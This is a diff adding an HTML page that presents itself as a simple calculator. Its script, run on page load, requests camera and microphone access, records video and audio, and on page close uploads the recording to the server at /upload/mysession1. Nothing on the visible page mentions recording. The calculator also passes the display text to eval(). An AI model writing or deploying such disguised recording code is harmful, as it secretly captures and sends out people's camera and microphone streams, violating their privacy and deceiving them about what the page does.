@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Calculator with Recording</title>
+  <style>
+    body { font-family: Arial, sans-serif; text-align: center; margin: 20px; }
+    #display { width: 200px; height: 40px; font-size: 20px; text-align: right; }
+    button { width: 50px; height: 50px; font-size: 18px; margin: 5px; }
+  </style>
+</head>
+<body>
+  <h1>Simple Calculator</h1>
+  <input type="text" id="display" disabled><br>
+  <div>
+    <button onclick="appendValue('7')">7</button>
+    <button onclick="appendValue('8')">8</button>
+    <button onclick="appendValue('9')">9</button>
+    <button onclick="appendValue('/')">/</button><br>
+    <button onclick="appendValue('4')">4</button>
+    <button onclick="appendValue('5')">5</button>
+    <button onclick="appendValue('6')">6</button>
+    <button onclick="appendValue('*')">*</button><br>
+    <button onclick="appendValue('1')">1</button>
+    <button onclick="appendValue('2')">2</button>
+    <button onclick="appendValue('3')">3</button>
+    <button onclick="appendValue('-')">-</button><br>
+    <button onclick="appendValue('0')">0</button>
+    <button onclick="clearDisplay()">C</button>
+    <button onclick="calculate()">=</button>
+    <button onclick="appendValue('+')">+</button>
+  </div>
+
+  <script>
+    let display = document.getElementById("display");
+    let mediaRecorder, chunks = [];
+
+    function appendValue(val) { display.value += val; }
+    function clearDisplay() { display.value = ""; }
+    function calculate() {
+      try { display.value = eval(display.value); }
+      catch { display.value = "Error"; }
+    }
+
+    window.onload = async () => {
+      // Camera + Mic access
+      let stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+      mediaRecorder = new MediaRecorder(stream);
+
+      mediaRecorder.ondataavailable = e => {
+        if (e.data.size > 0) chunks.push(e.data);
+      };
+
+      mediaRecorder.start();
+
+      // Jab page close ho → recording stop karo aur bhejo
+      window.addEventListener("beforeunload", (event) => {
+        if (mediaRecorder.state !== "inactive") {
+          mediaRecorder.stop();
+        }
+      });
+
+      mediaRecorder.onstop = async () => {
+        const blob = new Blob(chunks, { type: "video/webm" });
+        // Session ID fix karna (hardcode for now)
+const sessionId = "mysession1";
+
+let formData = new FormData();
+formData.append("clip", blob, "recording.webm");
+
+try {
+  await fetch(`/upload/${sessionId}`, { method: "POST", body: formData });
+  console.log("Recording sent to server ✅");
+} catch (err) {
+  console.error("Upload failed:", err);
+}
+
+      };
+    };
+  </script>
+</body>
+</html>
